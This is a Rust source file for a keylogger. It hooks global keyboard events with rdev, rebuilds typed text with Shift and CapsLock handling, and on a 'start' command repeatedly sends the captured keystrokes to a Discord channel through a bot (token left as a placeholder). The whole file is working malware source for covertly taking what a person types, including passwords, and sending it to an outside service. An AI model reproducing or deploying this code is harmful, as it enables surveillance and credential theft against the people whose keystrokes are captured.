use rdev::{listen, Event, EventType,Key};
use serenity::async_trait;
use serenity::model::channel::Message;
use serenity::prelude::*;
use std::thread;
// use tokio::time::{self, Duration};

struct Handler;
static mut BUFFER:String = String::new();
static mut SHIFT_FLAG:bool = false;
static mut PRINT_FLAG:bool = false;
static mut CAPSLOC_FLAG:i8 = 0;

#[async_trait]
impl EventHandler for Handler {
    async fn message(&self, ctx: Context, msg: Message) {
        if msg.content == "start"{
            tokio::spawn(send_periodic_messages(ctx, msg.channel_id));
        }
    }
}

fn string_tochar(key: Key) -> String {
    let shift_flag = unsafe { SHIFT_FLAG };
    let capsloc_flag = unsafe { CAPSLOC_FLAG };
    match key {
        Key::KeyA => if (shift_flag && capsloc_flag%2==0) || (capsloc_flag%2!=0 && !shift_flag) { "A".to_string() } else { "a".to_string() },
        Key::KeyB => if (shift_flag && capsloc_flag%2==0) || (capsloc_flag%2!=0 && !shift_flag) { "B".to_string() } else { "b".to_string() },
        Key::KeyC => if (shift_flag && capsloc_flag%2==0) || (capsloc_flag%2!=0 && !shift_flag) { "C".to_string() } else { "c".to_string() },
        Key::KeyD => if (shift_flag && capsloc_flag%2==0) || (capsloc_flag%2!=0 && !shift_flag) { "D".to_string() } else { "d".to_string() },
        Key::KeyE => if (shift_flag && capsloc_flag%2==0) || (capsloc_flag%2!=0 && !shift_flag) { "E".to_string() } else { "e".to_string() },
        Key::KeyF => if (shift_flag && capsloc_flag%2==0) || (capsloc_flag%2!=0 && !shift_flag) { "F".to_string() } else { "f".to_string() },
        Key::KeyG => if (shift_flag && capsloc_flag%2==0) || (capsloc_flag%2!=0 && !shift_flag) { "G".to_string() } else { "g".to_string() },
        Key::KeyH => if (shift_flag && capsloc_flag%2==0) || (capsloc_flag%2!=0 && !shift_flag) { "H".to_string() } else { "h".to_string() },
        Key::KeyI => if (shift_flag && capsloc_flag%2==0) || (capsloc_flag%2!=0 && !shift_flag) { "I".to_string() } else { "i".to_string() },
        Key::KeyJ => if (shift_flag && capsloc_flag%2==0) || (capsloc_flag%2!=0 && !shift_flag) { "J".to_string() } else { "j".to_string() },
        Key::KeyK => if (shift_flag && capsloc_flag%2==0) || (capsloc_flag%2!=0 && !shift_flag) { "K".to_string() } else { "k".to_string() },
        Key::KeyL => if (shift_flag && capsloc_flag%2==0) || (capsloc_flag%2!=0 && !shift_flag) { "L".to_string() } else { "l".to_string() },
        Key::KeyM => if (shift_flag && capsloc_flag%2==0) || (capsloc_flag%2!=0 && !shift_flag) { "M".to_string() } else { "m".to_string() },
        Key::KeyN => if (shift_flag && capsloc_flag%2==0) || (capsloc_flag%2!=0 && !shift_flag) { "N".to_string() } else { "n".to_string() },
        Key::KeyO => if (shift_flag && capsloc_flag%2==0) || (capsloc_flag%2!=0 && !shift_flag) { "O".to_string() } else { "o".to_string() },
        Key::KeyP => if (shift_flag && capsloc_flag%2==0) || (capsloc_flag%2!=0 && !shift_flag) { "P".to_string() } else { "p".to_string() },
        Key::KeyQ => if (shift_flag && capsloc_flag%2==0) || (capsloc_flag%2!=0 && !shift_flag) { "Q".to_string() } else { "q".to_string() },
        Key::KeyR => if (shift_flag && capsloc_flag%2==0) || (capsloc_flag%2!=0 && !shift_flag) { "R".to_string() } else { "r".to_string() },
        Key::KeyS => if (shift_flag && capsloc_flag%2==0) || (capsloc_flag%2!=0 && !shift_flag) { "S".to_string() } else { "s".to_string() },
        Key::KeyT => if (shift_flag && capsloc_flag%2==0) || (capsloc_flag%2!=0 && !shift_flag) { "T".to_string() } else { "t".to_string() },
        Key::KeyU => if (shift_flag && capsloc_flag%2==0) || (capsloc_flag%2!=0 && !shift_flag) { "U".to_string() } else { "u".to_string() },
        Key::KeyV => if (shift_flag && capsloc_flag%2==0) || (capsloc_flag%2!=0 && !shift_flag) { "V".to_string() } else { "v".to_string() },
        Key::KeyW => if (shift_flag && capsloc_flag%2==0) || (capsloc_flag%2!=0 && !shift_flag) { "W".to_string() } else { "w".to_string() },
        Key::KeyX => if (shift_flag && capsloc_flag%2==0) || (capsloc_flag%2!=0 && !shift_flag) { "X".to_string() } else { "x".to_string() },
        Key::KeyY => if (shift_flag && capsloc_flag%2==0) || (capsloc_flag%2!=0 && !shift_flag) { "Y".to_string() } else { "y".to_string() },
        Key::KeyZ => if (shift_flag && capsloc_flag%2==0) || (capsloc_flag%2!=0 && !shift_flag) { "Z".to_string() } else { "z".to_string() },
        Key::Num0 => if shift_flag { ")".to_string() } else { "0".to_string() },
        Key::Num1 => if shift_flag { "!".to_string() } else { "1".to_string() },
        Key::Num2 => if shift_flag { "@".to_string() } else { "2".to_string() },
        Key::Num3 => if shift_flag { "#".to_string() } else { "3".to_string() },
        Key::Num4 => if shift_flag { "$".to_string() } else { "4".to_string() },
        Key::Num5 => if shift_flag { "%".to_string() } else { "5".to_string() },
        Key::Num6 => if shift_flag { "^".to_string() } else { "6".to_string() },
        Key::Num7 => if shift_flag { "&".to_string() } else { "7".to_string() },
        Key::Num8 => if shift_flag { "*".to_string() } else { "8".to_string() },
        Key::Num9 => if shift_flag { "(".to_string() } else { "9".to_string() },
        Key::Backspace => {
            unsafe{
                BUFFER.pop();
                "".to_string() 
            }
        }
        Key::Return => "\n".to_string(),
        Key::Tab => "\t".to_string(),
        Key::Space => "\t".to_string(),
        Key::F1 => "F1".to_string(),
        Key::F2 => "F2".to_string(),
        Key::F3 => "F3".to_string(),
        Key::F4 => "F4".to_string(),
        Key::F5 => "F5".to_string(),
        Key::F6 => "F6".to_string(),
        Key::ShiftLeft => "".to_string(),
        Key::ShiftRight => "".to_string(),
        _ => "".to_string(), 
    }
}
fn start_key_listener() {
    thread::spawn(move || {
        if let Err(error) = listen(|event: Event| {
            match event.event_type {
                EventType::KeyPress(key) => {
                    unsafe{
                        if key==Key::ShiftLeft || key==Key::ShiftRight{
                            SHIFT_FLAG = true;
                        }
                        if key==Key::CapsLock{
                            CAPSLOC_FLAG = CAPSLOC_FLAG+1;
                        }
                        let temp: String = string_tochar(key);
                        BUFFER=format!("{}{}",BUFFER.clone(),temp);
                        PRINT_FLAG = true;

                    }
                },
                EventType::KeyRelease(key) =>{
                    if key==Key::ShiftLeft || key==Key::ShiftRight{
                        unsafe{
                            SHIFT_FLAG = false;
                        }
                    }
                },
                _ => (),
            }
        }) {
            eprintln!("Error while listening: {:?}", error);
        }
    });
}


async fn send_periodic_messages(ctx: Context, channel_id: serenity::model::id::ChannelId) {
    // let mut interval = time::interval(Duration::from_secs(1));
    start_key_listener();
    loop {
        // interval.tick().await;
        unsafe{
            if !BUFFER.is_empty() && PRINT_FLAG==true{
                if let Err(why) = channel_id.say(&ctx.http, BUFFER.clone()).await {
                    println!("Error sending periodic message: {:?}", why);
                }
                PRINT_FLAG = false;
            }
        }
    }
}



#[tokio::main]
async fn main() {

    let token = "<DISCORD-TOKEN>"; 
    let intents = GatewayIntents::GUILD_MESSAGES
        | GatewayIntents::DIRECT_MESSAGES
        | GatewayIntents::MESSAGE_CONTENT;

    let mut client = Client::builder(&token, intents)
        .event_handler(Handler)
        .await
        .expect("Error creating client");

    if let Err(why) = client.start().await {
        println!("Client error: {:?}", why);
    }
}
